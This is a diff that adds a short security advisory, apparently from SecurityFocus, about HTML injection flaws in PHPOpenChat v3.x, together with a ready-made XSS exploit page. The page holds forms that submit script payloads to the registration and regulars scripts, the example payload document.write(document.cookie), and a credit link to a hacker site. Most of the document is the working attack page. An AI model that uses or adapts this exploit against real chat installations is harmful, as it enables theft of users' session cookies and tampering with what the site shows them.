@@ -1,0 +1,53 @@
+source: http://www.securityfocus.com/bid/12841/info
+
+PHPOpenChat is reportedly affected by multiple remote HTML injection vulnerabilities. These issues are due to a failure in the application to properly sanitize user-supplied input before using it in dynamically generated content.
+
+Attacker-supplied HTML and script code would be able to access properties of the site, potentially allowing for theft of cookie-based authentication credentials. An attacker could also exploit this issue to control how the site is rendered to the user; other attacks are also possible. 
+
+<html>
+<head>
+<title>PHPOpenChat v3.x XSS Exploit</title>
+</head>
+<body>
+<h1>PHPOpenChat v3.x XSS Exploit</h1>
+<form method="POST" action="http://www.example.com/regulars.php">
+  <b>XSS in regulars.php:</b><p>
+  <input type="text" name="chatter" size="48" value="XSS Injection
+Code"></p>
+  </p>
+  <p>exmple:
+<script>document.write(document.cookie)</script></p>
+  <p><input type="submit" style="width:80px" value="Excute" name="B1"></p>
+</form>
+<form method="POST" action="http://www.example.com/register.php">
+  <b>XSS in register.php:</b><p>
+  Nikname:
+  <input type="text" name="chatter" size="48" value="XSS Injection
+Code"></p>
+  <p>
+  Password:
+  <input type="text" name="chatter1" size="48" value="XSS Injection
+Code"></p>
+  <p>
+  FirstName LastName:
+  <input type="text" name="chatter2" size="48" value="XSS Injection
+Code"></p>
+  <p>
+  Email:
+  <input type="text" name="chatter3" size="48" value="XSS Injection
+Code"></p>
+  <p>
+  Url of picture:
+  <input type="text" name="chatter4" size="48" value="XSS Injection
+Code"></p>
+  </p>
+  <p>exmple:
+<script>document.write(document.cookie)</script></p>
+  <p><input type="submit" style="width:80px" value="Excute" name="B1"></p>
+</form>
+<p>&nbsp;</p>
+<p align="center"><a
+href="http://www.PersianHacker.NET">www.PersianHacker.NET</a></p>
+</body>
+</html>
+
